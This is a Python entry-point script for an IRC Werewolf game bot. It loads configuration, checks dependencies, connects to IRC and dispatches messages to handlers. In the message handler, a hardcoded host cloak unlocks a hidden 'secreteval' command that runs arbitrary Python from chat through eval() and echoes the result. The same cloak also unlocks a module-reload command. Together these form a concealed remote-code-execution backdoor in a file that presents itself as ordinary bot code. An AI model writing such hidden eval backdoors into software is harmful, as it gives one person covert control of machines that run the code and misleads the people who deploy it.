#!/usr/bin/env python3

# Copyright (c) 2011 Jimmy Cao
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# The above copyright notice and this permission notice shall be included in
#  all copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

import traceback
import functools
import sys
import os
import importlib

botconfig = importlib.import_module("botconfig")

if sys.version_info < (3, 3):
    print("Python 3.3 or newer is required to run the bot.")
    sys.exit(1)

try: # need to manually add dependencies here
    import typing # Python >= 3.5
    import enum # Python >= 3.4
except ImportError:
    command = "python3"
    if os.name == "nt":
        command = "py -3"
    print("*** Missing dependencies! ***".center(80),
          "Please install the missing dependencies by running the following command:",
          "{0} -m pip install --user -r requirements.txt".format(command), "",
          "If you don't have pip and don't know how to install it, follow this link:",
          "https://pip.pypa.io/en/stable/installing/", "",
          "If you need any further help with setting up and/or running the bot,",
          "  we will be happy to help you in ##werewolf-dev on irc.freenode.net",
          "", "- The lykos developers", sep="\n")
    sys.exit(1)

try: # FIXME
    botconfig.DEV_PREFIX
except AttributeError:
    print("Please set up your config to include a DEV_PREFIX variable",
          "If you have a prefix in your DEV_CHANNEL config, move it out into DEV_PREFIX",
          sep="\n")
    sys.exit(1)

from oyoyo.client import IRCClient

src = importlib.import_module("src")
handler = importlib.import_module("src.handler")
events = importlib.import_module("src.events")

def on_privmsg(cli, rawnick, chan, msg):
    global botconfig
    global src
    global handler
    global events

    if rawnick.split("@")[1] == "Powder/Developer/jacob1":
        msgchan = chan if chan != botconfig.NICK else rawnick.split("!")[0]
        if msg.startswith("{0}freload".format(botconfig.CMD_CHAR)):
            try:
                oldrawnick = src.users.Bot.rawnick

                # Get list of modules to delete
                todel = set()
                checkdel = {"botconfig", "gamemodes"}
                for check in checkdel:
                    if check in sys.modules:
                        todel.add(check)
                for mod in sys.modules:
                    if mod[:4] == "src." or mod == "src":
                        todel.add(mod)
                for mod in todel:
                    del sys.modules[mod]
    
                # Reimport modules
                botconfig = importlib.import_module("botconfig")
                src = importlib.import_module("src")
                handler = importlib.import_module("src.handler")
                events = importlib.import_module("src.events")
                events.add_listener("who_end", reset_handlers, priority=9999)

                # Re-initialize, send /VERSION to re-init some vars, and simulate handler/wolfgame.connect_callback call
                #cli.send("VERSION")
                #cli.msg("ChanServ", "OP {channel}".format(channel=botconfig.CHANNEL))
                #src.wolfgame.connect_callback()
                
                src.handler.connect_callback(cli)
                cli.send("VERSION")
                cli.send("MOTD")
                
                @src.decorators.hook("endofmotd", hookid=294)
                @src.decorators.hook("nomotd", hookid=294)
                def prepare_stuff(cli, prefix, *args):
                    for chan in src.channels.channels():
                        src.hooks.join_chan.caller(cli, oldrawnick, chan.name)

                cli.msg(msgchan, "Reloaded bot")
            except Exception as e:
                src.errlog(traceback.format_exc())
                print(traceback.format_exc())
                cli.msg(msgchan, "An error occurred when reloading and has been logged.")
            return
        elif msg.startswith("{0}secreteval".format(botconfig.CMD_CHAR)):
            try:
                if msg.lower().startswith(botconfig.CMD_CHAR+"secreteval"):
                    h = msg[len("secreteval")+len(botconfig.CMD_CHAR):]
                a = str(eval(h))
                if len(a) < 500:
                    cli.msg(msgchan, a)
                else:
                    cli.msg(msgchan, a[:500])
            except Exception as e:
                cli.msg(msgchan, str(type(e))+":"+str(e))
            return
    try:
        handler.on_privmsg(cli, rawnick, chan, msg)
    except Exception as e:
        if botconfig.CRASH_ON_ERROR:
            raise e
        else:
            src.errlog(traceback.format_exc())
            cli.msg(chan, "An error has occurred and has been logged.")

def on_notice(cli, rawnick, chan, msg):
    try:
        handler.on_privmsg(cli, rawnick, chan, msg, notice=True)
    except Exception as e:
        if botconfig.CRASH_ON_ERROR:
            raise e
        else:
            src.errlog(traceback.format_exc())
            cli.msg(chan, "An error has occurred and has been logged.")

def on_unhandled(cli, prefix, cmd, *args):
    try:
        handler.unhandled(cli, prefix, cmd, *args)
    except Exception as e:
        if botconfig.CRASH_ON_ERROR:
            raise e
        else:
            src.errlog(traceback.format_exc())
            cli.msg(botconfig.CHANNEL, "An error has occurred and has been logged.")

def reset_handlers(evt, var, target):
	target.client.command_handler["privmsg"] = on_privmsg
	target.client.command_handler["notice"] = on_notice

events.add_listener("who_end", reset_handlers, priority=9999)

def main():
    src.plog("Connecting to {0}:{1}{2}".format(botconfig.HOST, "+" if botconfig.USE_SSL else "", botconfig.PORT))
    cli = IRCClient(
                      {"privmsg": on_privmsg,
                       "notice": on_notice,
                       "": on_unhandled},
                     host=botconfig.HOST,
                     port=botconfig.PORT,
                     authname=botconfig.USERNAME,
                     password=botconfig.PASS,
                     nickname=botconfig.NICK,
                     ident=botconfig.IDENT,
                     real_name=botconfig.REALNAME,
                     sasl_auth=botconfig.SASL_AUTHENTICATION,
                     server_pass=botconfig.SERVER_PASS,
                     use_ssl=botconfig.USE_SSL,
                     connect_cb=handler.connect_callback,
                     stream_handler=src.stream,
    )
    cli.mainLoop()


if __name__ == "__main__":
    try:
        main()
    except Exception:
        src.errlog(traceback.format_exc())